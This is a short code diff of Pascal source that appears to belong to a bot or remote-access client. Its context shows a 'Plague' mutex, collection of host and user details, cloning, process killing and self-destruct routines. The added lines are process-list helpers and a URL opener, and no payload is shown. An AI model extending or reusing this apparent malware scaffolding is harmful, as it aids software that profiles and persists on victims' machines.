@@ -28,6 +28,9 @@ procedure MutexMagic;
 function CreateClone(CloneName: String): Boolean;
 function TerminateProcessByID(ProcessID: Cardinal): Boolean;
 procedure CheckProxy;
+procedure AddProcessToList(PID: Cardinal);
+procedure RemoveProcessFromList(PID: Cardinal);
+procedure OpenURL(URL: String);
 
 var
   Nick, OS, ComputerName, UserName, CPU, GPU: String;
@@ -45,7 +48,8 @@ var
   ProxyIP: String;
   ProxyPort: Cardinal;
 
-  IsUninstalling: Boolean = false;
+  _C: Word = 0;
+  ChildProc: Array of Cardinal;
 
 implementation
 
@@ -82,6 +86,36 @@ procedure MutexMagic;
 Begin
   Mutex:=CreateMutex(Nil, True, PChar(Settings.ReadString('General', 'Mutex', 'Plague')));
   if GetLastError=ERROR_ALREADY_EXIST then Halt(0);
+end;
+
+procedure AddProcessToList(PID: Cardinal);
+Begin
+  Inc(_C);
+  SetLength(ChildProc, _C);
+  ChildProc[_C - 1]:=PID;
+End;
+
+procedure OpenURL(URL: String);
+Begin
+  ShellExecute(0, 'open', PChar(URL), Nil, Nil, SW_SHOWNORMAL);
+end;
+
+procedure RemoveProcessFromList(PID: Cardinal);
+var
+  J, I: LongInt;
+Begin
+  I:=-1;
+  For J:=0 to _C-1 do
+    if ChildProc[J]=PID then Begin
+      I:=J;
+      Break;
+    end;
+  if I>-1 then Begin
+    For J:=I to _C-2 do
+      ChildProc[J]:=ChildProc[J+1];
+    Dec(_C);
+    SetLength(ChildProc, _C);
+  end;
 end;
 
 procedure Selfdestruct;
